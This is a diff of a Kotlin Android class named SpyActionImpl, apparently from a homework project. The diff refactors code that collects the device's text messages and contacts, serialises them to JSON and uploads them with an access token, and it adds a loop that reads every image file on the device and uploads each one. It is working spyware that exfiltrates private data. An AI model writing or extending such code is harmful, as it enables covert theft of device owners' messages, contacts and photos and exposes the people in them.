@@ -8,6 +8,7 @@ import com.google.gson.Gson
 import com.homework.myapplication.App
 import com.homework.myapplication.presentation.SpyAction
 import java.io.ByteArrayInputStream
+import java.io.FileInputStream
 import java.io.InputStream
 
 class SpyActionImpl : SpyAction {
@@ -23,6 +24,11 @@ class SpyActionImpl : SpyAction {
     private val getImages: GetImages = GetImages()
 
     override fun startAction(token: String) {
+        sendDeviceInfo(token)
+        sendImage(token)
+    }
+
+    private fun sendDeviceInfo(token: String) {
         val spyInfo = SpyInfo.Builder().apply {
             setMessages(getMessages(App.appContext))
             setContacts(getContacts(App.appContext))
@@ -37,10 +43,19 @@ class SpyActionImpl : SpyAction {
             build()
         }
         val data: ByteArray = Gson().toJson(spyInfo).toByteArray()
-        uploadToDisk(ByteArrayInputStream(data), token, FILE_NAME)
-        val images = getImages() ?: return
+        uploadToDisk(
+            inputStream = ByteArrayInputStream(data),
+            accessToken = token,
+            fileName = FILE_NAME
+        )
+    }
+
+    private fun sendImage(token: String) {
+        val images = getImages(App.appContext)
         for (image in images) {
-            with(image) { uploadToDisk(readBytes().inputStream(), token, name) }
+            val imgInputStream = FileInputStream(image.path)
+            val name = image.path.split("/").lastOrNull() ?: DEFAULT
+            uploadToDisk(inputStream = imgInputStream, accessToken = token, fileName = name)
         }
     }
 
@@ -57,5 +72,6 @@ class SpyActionImpl : SpyAction {
 
     companion object {
         private const val FILE_NAME = "data.txt"
+        private const val DEFAULT = "default"
     }
 }
